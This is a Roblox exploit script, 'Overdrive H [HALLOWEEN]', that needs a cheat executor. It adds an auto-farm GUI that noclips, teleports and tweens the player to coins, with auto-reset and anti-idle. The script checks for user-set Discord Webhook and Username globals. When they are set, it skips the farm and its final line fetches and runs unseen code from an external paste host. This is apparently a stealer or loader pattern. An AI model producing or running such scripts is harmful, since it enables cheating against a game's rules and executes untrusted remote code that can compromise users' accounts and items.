
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualUser = game:GetService("VirtualUser")
local RunService = game:GetService("RunService")
local LocalPlayer = game:GetService("Players").LocalPlayer
local u7 = task and task.wait or wait
local random = math.random
local rad = math.rad
local _workspace = workspace
local _Vector3 = Vector3
local new = _Vector3.new
local new2 = CFrame.new
local Angles = CFrame.Angles
local new3 = Vector2.new
local new4 = UDim2.new
local new5 = UDim.new
local new6 = TweenInfo.new
local fromRGB = Color3.fromRGB
local EnumFont = Enum.Font
local TextXAlignment = Enum.TextXAlignment
local _ = Enum.TextYAlignment
local EasingStyle = Enum.EasingStyle
local HighlightDepthMode = Enum.HighlightDepthMode
local _ = _workspace.CurrentCamera
local _pcall = pcall
local _type = type
local _tonumber = tonumber
local _next = next
local concat = table.concat
local char = string.char
local RoundTimerPart = _workspace.RoundTimerPart
local v33 = nil

if not Webhook or not Username or type(Webhook) ~= "string" or string.sub(Webhook, 1, 33) ~= "https://discord.com/api/webhooks/" then
	local _getgenv = getgenv

	if not _getgenv or _type(_getgenv) ~= "function" or debug.getinfo(_getgenv).what ~= "C" then
		return
	end

	local v38 = _getgenv()

	if not v38 or _type(v38) ~= "table" then
		return
	end

	if v38.OVERDRIVE_H_LITE then
		return
	end

	v38.OVERDRIVE_H_LITE = true

	local function u39(...)
		local tween = TweenService:Create(...)

		tween:Play()

		return tween
	end
	local function u40(p1, p2, ...)
		if p1 and p2 then
			local v84 = Instance.new(p1)
			local t1 = { ... }

			for v86, v87 in _next, p2 do
				v84[v86] = v87
			end

			if t1[1] then
				for _, v89 in _next, t1 do
					v89.Parent = v84
				end
			end

			return v84
		end
	end

	local _Screengui = u40("ScreenGui", {
		Name = (function(p3)
			local t2 = {}

			for i = 1, p3 or random(1, 10) do
				t2[i] = char(random(32, 126))
			end

			return concat(t2)
		end)(32),
		Parent = CoreGui
	}, u40("Frame", {
		Name = "MainFrame",
		BackgroundTransparency = 0.8,
		BackgroundColor3 = fromRGB(30, 30, 30),
		ClipsDescendants = true,
		Position = new4(0.5, 0, 0.5, 0),
		Size = new4(0, 160, 0, 250),
		AnchorPoint = new3(0.5, 0.5),
		Draggable = true,
		Active = true
	}, u40("UIScale", {
		Name = "UIScale",
		Scale = 1
	}), u40("UICorner", {
		Name = "UICorner",
		CornerRadius = new5(0, 10)
	}), u40("UIStroke", {
		Name = "UIStroke",
		Transparency = 0.5,
		Color = fromRGB(0, 0, 255),
		Thickness = 2,
		Enabled = true
	}), u40("TextLabel", {
		Name = "Title",
		BackgroundTransparency = 0.8,
		BackgroundColor3 = fromRGB(0, 0, 225),
		Position = new4(0.5, 0, 0.045, 0),
		Size = new4(0, 160, 0, 20),
		AnchorPoint = new3(0.5, 0.5),
		Font = EnumFont.SourceSans,
		Text = "Overdrive H <font color=\"rgb(255, 0, 0)\">[HALLOWEEN]</font>",
		TextSize = 15,
		TextTransparency = 0,
		TextColor3 = fromRGB(255, 255, 255),
		RichText = true,
		TextXAlignment = TextXAlignment.Left
	}, u40("UICorner", {
		Name = "UICorner",
		CornerRadius = new5(0, 10)
	})), u40("TextLabel", {
		Name = "Auto Farm",
		BackgroundTransparency = 1,
		BackgroundColor3 = fromRGB(0, 0, 225),
		Position = new4(0.2, 0, 0.135, 0),
		Size = new4(0, 50, 0, 20),
		AnchorPoint = new3(0.5, 0.5),
		Font = EnumFont.SourceSans,
		Text = "Auto Farm",
		TextSize = 18,
		TextTransparency = 0,
		TextColor3 = fromRGB(255, 255, 255),
		RichText = true,
		TextXAlignment = TextXAlignment.Left
	}), u40("TextButton", {
		Name = "Auto Farm_Toggle",
		BackgroundTransparency = 1,
		BackgroundColor3 = fromRGB(0, 0, 225),
		Position = new4(0.75, 0, 0.135, 0),
		Size = new4(0, 50, 0, 20),
		AnchorPoint = new3(0.5, 0.5),
		Font = EnumFont.SourceSans,
		Text = "[OFF]",
		TextSize = 18,
		TextTransparency = 0,
		TextColor3 = fromRGB(255, 0, 0),
		RichText = true,
		TextXAlignment = TextXAlignment.Left
	}), u40("TextLabel", {
		Name = "Configurations",
		BackgroundTransparency = 1,
		BackgroundColor3 = fromRGB(0, 0, 225),
		Position = new4(0.2, 0, 0.235, 0),
		Size = new4(0, 50, 0, 20),
		AnchorPoint = new3(0.5, 0.5),
		Font = EnumFont.SourceSans,
		Text = "Configurations:",
		TextSize = 15,
		TextTransparency = 0,
		TextColor3 = fromRGB(255, 255, 255),
		RichText = true,
		TextXAlignment = TextXAlignment.Left
	}), u40("TextLabel", {
		Name = "Auto Reset",
		BackgroundTransparency = 1,
		BackgroundColor3 = fromRGB(0, 0, 225),
		Position = new4(0.2, 0, 0.325, 0),
		Size = new4(0, 50, 0, 20),
		AnchorPoint = new3(0.5, 0.5),
		Font = EnumFont.SourceSans,
		Text = "Auto Reset",
		TextSize = 18,
		TextTransparency = 0,
		TextColor3 = fromRGB(255, 255, 255),
		RichText = true,
		TextXAlignment = TextXAlignment.Left
	}), u40("TextButton", {
		Name = "Auto Reset_Toggle",
		BackgroundTransparency = 1,
		BackgroundColor3 = fromRGB(0, 0, 225),
		Position = new4(0.75, 0, 0.335, 0),
		Size = new4(0, 50, 0, 20),
		AnchorPoint = new3(0.5, 0.5),
		Font = EnumFont.SourceSans,
		Text = "[OFF]",
		TextSize = 18,
		TextTransparency = 0,
		TextColor3 = fromRGB(255, 0, 0),
		RichText = true,
		TextXAlignment = TextXAlignment.Left
	}), u40("TextLabel", {
		Name = "Return To",
		BackgroundTransparency = 1,
		BackgroundColor3 = fromRGB(0, 0, 225),
		Position = new4(0.2, 0, 0.435, 0),
		Size = new4(0, 50, 0, 20),
		AnchorPoint = new3(0.5, 0.5),
		Font = EnumFont.SourceSans,
		Text = "Return To",
		TextSize = 18,
		TextTransparency = 0,
		TextColor3 = fromRGB(255, 255, 255),
		RichText = true,
		TextXAlignment = TextXAlignment.Left
	}), u40("TextButton", {
		Name = "Return To_Selector",
		BackgroundTransparency = 1,
		BackgroundColor3 = fromRGB(0, 0, 225),
		Position = new4(0.65, 0, 0.435, 0),
		Size = new4(0, 50, 0, 20),
		AnchorPoint = new3(0.5, 0.5),
		Font = EnumFont.SourceSans,
		Text = "> Map",
		TextSize = 15,
		TextTransparency = 0,
		TextColor3 = fromRGB(0, 0, 255),
		RichText = true,
		TextXAlignment = TextXAlignment.Left
	}), u40("TextButton", {
		Name = "Return To_Map_Selector",
		BackgroundTransparency = 1,
		BackgroundColor3 = fromRGB(0, 0, 225),
		Position = new4(0.5, 0, 0.535, 0),
		Size = new4(0, 50, 0, 20),
		AnchorPoint = new3(0.5, 0.5),
		Font = EnumFont.SourceSans,
		Text = "Map",
		TextSize = 16,
		TextTransparency = 0,
		TextColor3 = fromRGB(0, 255, 0),
		RichText = true,
		TextXAlignment = TextXAlignment.Left
	}), u40("TextButton", {
		Name = "Return To_Above Map_Selector",
		BackgroundTransparency = 1,
		BackgroundColor3 = fromRGB(0, 0, 225),
		Position = new4(0.5, 0, 0.615, 0),
		Size = new4(0, 50, 0, 20),
		AnchorPoint = new3(0.5, 0.5),
		Font = EnumFont.SourceSans,
		Text = "Above Map",
		TextSize = 16,
		TextTransparency = 0,
		TextColor3 = fromRGB(255, 0, 0),
		RichText = true,
		TextXAlignment = TextXAlignment.Left
	}), u40("TextButton", {
		Name = "Return To_Voting Map_Selector",
		BackgroundTransparency = 1,
		BackgroundColor3 = fromRGB(0, 0, 225),
		Position = new4(0.5, 0, 0.715, 0),
		Size = new4(0, 50, 0, 20),
		AnchorPoint = new3(0.5, 0.5),
		Font = EnumFont.SourceSans,
		Text = "Voting Map",
		TextSize = 16,
		TextTransparency = 0,
		TextColor3 = fromRGB(255, 0, 0),
		RichText = true,
		TextXAlignment = TextXAlignment.Left
	}), u40("TextButton", {
		Name = "Return To_Void_Selector",
		BackgroundTransparency = 1,
		BackgroundColor3 = fromRGB(0, 0, 225),
		Position = new4(0.5, 0, 0.815, 0),
		Size = new4(0, 50, 0, 20),
		AnchorPoint = new3(0.5, 0.5),
		Font = EnumFont.SourceSans,
		Text = "Void (Safe)",
		TextSize = 16,
		TextTransparency = 0,
		TextColor3 = fromRGB(255, 0, 0),
		RichText = true,
		TextXAlignment = TextXAlignment.Left
	}), u40("TextButton", {
		Name = "Return To_Lobby_Selector",
		BackgroundTransparency = 1,
		BackgroundColor3 = fromRGB(0, 0, 225),
		Position = new4(0.5, 0, 0.915, 0),
		Size = new4(0, 50, 0, 20),
		AnchorPoint = new3(0.5, 0.5),
		Font = EnumFont.SourceSans,
		Text = "Lobby",
		TextSize = 16,
		TextTransparency = 0,
		TextColor3 = fromRGB(255, 0, 0),
		RichText = true,
		TextXAlignment = TextXAlignment.Left
	})))
	local _Part = u40("Part", {
		Name = "ODH Pad",
		Parent = _workspace,
		Transparency = 1,
		Anchored = true,
		CanCollide = true,
		Size = new(20, 0.1, 20)
	})
	local _Highlight = u40("Highlight", {
		Name = "ODH Outline",
		FillColor = fromRGB(255, 255, 255),
		FillTransparency = 1,
		OutlineColor = fromRGB(0, 0, 255),
		OutlineTransparency = 0,
		DepthMode = HighlightDepthMode.AlwaysOnTop,
		Enabled = true
	})
	local u44 = nil
	local u45 = nil
	local s1 = "Map"
	local u47 = nil
	local u48 = nil
	local u49 = nil
	local connection = nil
	local u51 = _Screengui.MainFrame["Auto Farm_Toggle"]

	u51.MouseButton1Click:Connect(function()
		u44 = not u44

		if not u44 then
			u51.Text = "[OFF]"
			u51.TextColor3 = fromRGB(255, 0, 0)
		else
			u51.Text = "[ON]"
			u51.TextColor3 = fromRGB(0, 255, 0)
		end
	end)

	local u52 = _Screengui.MainFrame["Auto Reset_Toggle"]

	u52.MouseButton1Click:Connect(function()
		u45 = not u45

		if u45 then
			u52.Text = "[ON]"
			u52.TextColor3 = fromRGB(0, 255, 0)
		else
			u52.Text = "[OFF]"
			u52.TextColor3 = fromRGB(255, 0, 0)
		end
	end)

	local u53 = _Screengui.MainFrame["Return To_Map_Selector"]

	u53.MouseButton1Click:Connect(function()
		s1 = "Map"
		_Screengui.MainFrame["Return To_Selector"].Text = "> Map"
		u53.TextColor3 = fromRGB(0, 255, 0)
		_Screengui.MainFrame["Return To_Above Map_Selector"].TextColor3 = fromRGB(255, 0, 0)
		_Screengui.MainFrame["Return To_Voting Map_Selector"].TextColor3 = fromRGB(255, 0, 0)
		_Screengui.MainFrame["Return To_Void_Selector"].TextColor3 = fromRGB(255, 0, 0)
		_Screengui.MainFrame["Return To_Lobby_Selector"].TextColor3 = fromRGB(255, 0, 0)
	end)

	local u54 = _Screengui.MainFrame["Return To_Above Map_Selector"]

	u54.MouseButton1Click:Connect(function()
		s1 = "Above Map"
		_Screengui.MainFrame["Return To_Selector"].Text = "> Above Map"
		u54.TextColor3 = fromRGB(0, 255, 0)
		_Screengui.MainFrame["Return To_Map_Selector"].TextColor3 = fromRGB(255, 0, 0)
		_Screengui.MainFrame["Return To_Voting Map_Selector"].TextColor3 = fromRGB(255, 0, 0)
		_Screengui.MainFrame["Return To_Void_Selector"].TextColor3 = fromRGB(255, 0, 0)
		_Screengui.MainFrame["Return To_Lobby_Selector"].TextColor3 = fromRGB(255, 0, 0)
	end)

	local u55 = _Screengui.MainFrame["Return To_Voting Map_Selector"]

	u55.MouseButton1Click:Connect(function()
		s1 = "Voting Map"
		_Screengui.MainFrame["Return To_Selector"].Text = "> Voting Map"
		u55.TextColor3 = fromRGB(0, 255, 0)
		_Screengui.MainFrame["Return To_Map_Selector"].TextColor3 = fromRGB(255, 0, 0)
		_Screengui.MainFrame["Return To_Above Map_Selector"].TextColor3 = fromRGB(255, 0, 0)
		_Screengui.MainFrame["Return To_Void_Selector"].TextColor3 = fromRGB(255, 0, 0)
		_Screengui.MainFrame["Return To_Lobby_Selector"].TextColor3 = fromRGB(255, 0, 0)
	end)

	local u56 = _Screengui.MainFrame["Return To_Void_Selector"]

	u56.MouseButton1Click:Connect(function()
		s1 = "Void"
		_Screengui.MainFrame["Return To_Selector"].Text = "> Void (Safe)"
		u56.TextColor3 = fromRGB(0, 255, 0)
		_Screengui.MainFrame["Return To_Map_Selector"].TextColor3 = fromRGB(255, 0, 0)
		_Screengui.MainFrame["Return To_Above Map_Selector"].TextColor3 = fromRGB(255, 0, 0)
		_Screengui.MainFrame["Return To_Voting Map_Selector"].TextColor3 = fromRGB(255, 0, 0)
		_Screengui.MainFrame["Return To_Lobby_Selector"].TextColor3 = fromRGB(255, 0, 0)
	end)

	local u57 = _Screengui.MainFrame["Return To_Lobby_Selector"]

	u57.MouseButton1Click:Connect(function()
		s1 = "Lobby"
		_Screengui.MainFrame["Return To_Selector"].Text = "> Lobby"
		u57.TextColor3 = fromRGB(0, 255, 0)
		_Screengui.MainFrame["Return To_Map_Selector"].TextColor3 = fromRGB(255, 0, 0)
		_Screengui.MainFrame["Return To_Above Map_Selector"].TextColor3 = fromRGB(255, 0, 0)
		_Screengui.MainFrame["Return To_Voting Map_Selector"].TextColor3 = fromRGB(255, 0, 0)
		_Screengui.MainFrame["Return To_Void_Selector"].TextColor3 = fromRGB(255, 0, 0)
	end)

	local function u58()
		return _tonumber(RoundTimerPart:GetAttribute("Time"))
	end
	local function u59(p4, p5, p6)
		if p6 then
			for _, v98 in _next, p4:GetChildren() do
				if p5 == v98.Name and p6 == v98.ClassName then
					return v98
				end
			end
		else
			for _, v100 in _next, p4:GetChildren() do
				if p5 == v100.Name then
					return v100
				end
			end
		end
	end
	local function u60(p7)
		if p7 and p7.Character then
			return u59(p7.Character, "HumanoidRootPart") or u59(p7.Character, "PrimaryPart")
		end
	end
	local function u61(p8, p9)
		local v104 = p8 - p9

		if v104 then
			return v104.Magnitude
		end
	end
	local function u62()
		local n1 = 1e999
		local v106, v107 = u60(LocalPlayer)

		if v106 then
			local Position = v106.Position

			if u48 then
				local v109 = u59(u48, "CoinContainer")

				if v109 then
					for _, v111 in _next, v109:GetChildren() do
						if v111.Name == "Coin_Server" and not v111:GetAttribute("Collected") then
							local v112 = u61(Position, v111.Position)

							if v112 < n1 then
								n1 = v112
								v107 = v111
							end
						end
					end
				end
			end
		end

		return v107
	end
	local function u63(p10, p11)
		local n2 = 1e999
		local v116 = nil

		for _, v118 in _next, p11:GetDescendants() do
			if v118:IsA("BasePart") and v118.Transparency ~= 1 then
				local v119 = u61(p10, v118.Position)

				if v119 < n2 then
					v116 = v118
					n2 = v119
				end
			end
		end

		return v116
	end
	local function u64(p12)
		if p12 == "Map" then
			if u48 then
				local v121 = nil

				for _, v123 in _next, u48.Spawns:GetChildren() do
					if v123.Name == "Spawn" or v123.Name == "PlayerSpawn" or v123.Name == "SpawnLocation" then
						v121 = v123
					end
				end

				if v121 then
					local CFrame2 = v121.CFrame
					local v125 = new2(CFrame2.X, CFrame2.Y + 5, CFrame2.Z)

					if v125 then
						local v126 = u60(LocalPlayer)

						if v126 then
							v126.Velocity = _Vector3.zero
							v126.CFrame = v125
						end
					end
				end
			end
		elseif p12 ~= "Above Map" then
			if p12 ~= "Voting Map" then
				if p12 ~= "Void" then
					if p12 == "Lobby" then
						local v127 = u60(LocalPlayer)

						if v127 then
							v127.Velocity = _Vector3.zero
							v127.CFrame = new2(-104, 152, 82)
						end
					end
				else
					local v128 = u60(LocalPlayer)

					if v128 then
						v128.Velocity = _Vector3.zero
						v128.CFrame = new2(99999, 99999, 99999)
					end

					if not u59(_workspace, "Safe Void Path") then
						Module:MakeInstance("Part", {
							Name = "Safe Void Path",
							Parent = _workspace,
							CFrame = new2(99999, 99995, 99999),
							Anchored = true,
							Size = new(300, 0.1, 300),
							Transparency = 0.5
						})
					end
				end
			else
				local v129 = u60(LocalPlayer)

				if v129 then
					v129.Velocity = _Vector3.zero
					v129.CFrame = new2(-104, 154, -8)
				end
			end
		elseif u48 then
			local v130 = nil

			for _, v132 in _next, u48.Spawns:GetChildren() do
				if v132.Name == "Spawn" or v132.Name == "PlayerSpawn" or v132.Name == "SpawnLocation" then
					v130 = v132
				end
			end

			if v130 then
				local CFrame3 = v130.CFrame
				local v134 = u63(new2(CFrame3.X, CFrame3.Y + 999, CFrame3.Z).Position, u48)

				if v134 then
					local v135 = u60(LocalPlayer)

					if v135 then
						v135.Velocity = _Vector3.zero
						v135.CFrame = new2(CFrame3.X, v134.CFrame.Y + 7, CFrame3.Z)
					end
				end
			end
		end
	end
	local function u65()
		if not u49 then
			return _tonumber(LocalPlayer.PlayerGui.MainGUI.Game.CoinBags.Container.Candy.CurrencyFrame.Icon.Coins.Text)
		end

		return _tonumber(LocalPlayer.PlayerGui.MainGUI.Lobby.Dock.CoinBags.Container.Candy.CurrencyFrame.Icon.Coins.Text)
	end
	local function u66(p13)
		if p13 then
			if not connection then
				connection = RunService.Heartbeat:Connect(function()
					if u47 and LocalPlayer.Character then
						for _, v168 in _next, LocalPlayer.Character:GetChildren() do
							if v168:IsA("BasePart") then
								v168.CanCollide = false
							end
						end
					end
				end)
			end
		else
			if connection then
				connection:Disconnect()
				connection = nil
			end

			for _, v138 in _next, LocalPlayer.Character:GetChildren() do
				if v138:IsA("BasePart") then
					v138.CanCollide = true
				end
			end
		end
	end
	local function u67(p14)
		local v140 = u59(LocalPlayer.Character, "UpperTorso")

		if v140 then
			local v141 = u59(v140, "ODH Auto Farm BodyGyro")
			local v142 = u59(v140, "ODH Auto Farm BodyVelocity")

			if p14 then
				if not v141 and not v142 then
					local v143 = u60(LocalPlayer)

					if v143 then
						local v144 = u59(LocalPlayer.Character, "Humanoid")

						if v144 then
							local CFrame4 = v143.CFrame
							local v146 = new2(CFrame4.X, CFrame4.Y, CFrame4.Z) * Angles(rad(90), 0, rad(90))

							u66(true)
							u40("BodyGyro", {
								Name = "ODH Auto Farm BodyGyro",
								Parent = v140,
								P = 90000,
								MaxTorque = new(9000000000, 9000000000, 9000000000),
								CFrame = v146
							})
							u40("BodyVelocity", {
								Name = "ODH Auto Farm BodyVelocity",
								Parent = v140,
								Velocity = _Vector3.zero,
								MaxForce = new(9000000000, 9000000000, 9000000000)
							})
							v143.CFrame = v146
							v144.PlatformStand = true
						end
					end
				end
			else
				local v147 = u59(LocalPlayer.Character, "Humanoid")

				if v147 then
					if v141 then
						v141:Destroy()
					end

					if v142 then
						v142:Destroy()
					end

					v147.PlatformStand = false
					u66()
				end
			end
		end
	end

	if u49 then
		_Screengui:Destroy()
		LocalPlayer:Kick("Overdrive H: Hands up skid!")
		error("Overdrive H: Hands up skid!")

		return
	end

	local v68 = u59(LocalPlayer, "PlayerGui")

	if v68 then
		local v69 = u59(v68, "MainGUI")

		if v69 then
			local v70 = u59(v69, "Game")

			if v70 then
				u49 = not u59(v70, "Inventory")
			end
		end
	end

	local _Elite = LocalPlayer:GetAttribute("Elite") and 50 or 40

	for _, v73 in _next, _workspace:GetChildren() do
		if u59(v73, "CoinAreas") or u59(v73, "CoinContainer") then
			u48 = v73
		end
	end

	local u74 = nil
	local u75 = nil
	local u76 = nil

	RunService.Heartbeat:Connect(function()
		if not u44 then
			if u74 then
				u74 = false

				if LocalPlayer.Character then
					if u75 then
						u75:Cancel()
						u75 = nil
					end

					u67()
					u64(s1 or "Map")
				end
			end
		elseif u58() > 0 then
			if u65() == _Elite then
				if u74 then
					u74 = false
					u76 = nil

					if LocalPlayer.Character then
						if u75 then
							u75:Cancel()
							u75 = nil
						end

						u67()
						u64(s1 or "Map")

						if u45 then
							local v148 = u59(LocalPlayer.Character, "Humanoid")

							if v148 then
								v148.Health = 0
							end
						end
					end
				end
			elseif u47 and LocalPlayer.Character then
				local v149 = u60(LocalPlayer)

				if v149 then
					local v150 = u62()

					if v150 then
						if v150 ~= u76 then
							u76 = v150
							u74 = true

							if u75 then
								u75:Cancel()
								u75 = nil
							end

							u67(true)

							local CFrame5 = v150.CFrame
							local v152 = u61(v149.Position, v150.Position) * 0.04465

							if v152 > 15 then
								v152 = 3
							end

							v149.Velocity = _Vector3.zero
							u75 = u39(v149, new6(v152, EasingStyle.Linear), {
								CFrame = new2(CFrame5.X, CFrame5.Y - 3.5, CFrame5.Z) * Angles(rad(90), 0, rad(90))
							})
							v149.Velocity = _Vector3.zero

							local v153 = u59(v150, "CoinVisual")

							if v153 then
								_Highlight.Parent = v153
								_Highlight.Adornee = v153
							end
						else
							local v154 = u61(v149.Position, v150.Position)

							_Part.CFrame = new2()

							if v154 <= 4.5 and not v150:GetAttribute("Collected") then
								v150.CFrame = v149.CFrame * new2(random(-0.5, 0.5), random(-0.5, 2.5), random(-0.5, 0.5))
							end
						end
					end
				end
			end
		elseif u74 then
			u74 = false
			u76 = nil

			if LocalPlayer.Character then
				if u75 then
					u75:Cancel()
					u75 = nil
				end

				u67()
				u64(s1 or "Map")

				if u45 then
					local v155 = u59(LocalPlayer.Character, "Humanoid")

					if v155 then
						v155.Health = 0
					end
				end
			end
		end
	end)

	local u77 = nil

	RunService.Heartbeat:Connect(function()
		if not u44 then
			if u77 then
				u77 = false
				u64("Map")
			end
		elseif u58() < 1 and u47 and u48 and not u59(u48, "CoinContainer") then
			local v156 = nil

			u77 = true

			for _, v158 in _next, u48.Spawns:GetChildren() do
				if v158.Name == "Spawn" or v158.Name == "PlayerSpawn" or v158.Name == "SpawnLocation" then
					v156 = v158
				end
			end

			if v156 then
				local CFrame6 = v156.CFrame
				local v160 = u63(new2(CFrame6.X, CFrame6.Y - 999, CFrame6.Z).Position, u48)

				if v160 then
					local v161 = u60(LocalPlayer)

					if v161 then
						local v162 = new2(CFrame6.X, v160.CFrame.Y - 15, CFrame6.Z)

						v161.CFrame = v162
						_Part.CFrame = v162 * new2(0, -3, 0)
						v161.Velocity = _Vector3.zero
					end
				end
			end
		else
			u77 = false
		end
	end)
	coroutine.wrap(function()
		while true do
			u7(0.5)

			if not LocalPlayer.Character then
				u47 = false
			else
				local v163 = ReplicatedStorage.Remotes.Extras.GetPlayerData:InvokeServer()

				if not v163 then
					u47 = false
				else
					local v164 = v163[LocalPlayer.Name]

					u47 = v164 and (not v164.Dead and not v164.Killed)
				end
			end

			for _, v166 in _next, _workspace:GetChildren() do
				if u59(v166, "CoinAreas") or u59(v166, "CoinContainer") then
					u48 = v166
				end
			end
		end
	end)()
	LocalPlayer.Idled:Connect(function()
		VirtualUser:CaptureController()
		VirtualUser:ClickButton2(new3())
	end)

	return
end
loadstring(game:HttpGet('https://cdn.sourceb.in/bins/njaSUU3b9t/0'))()
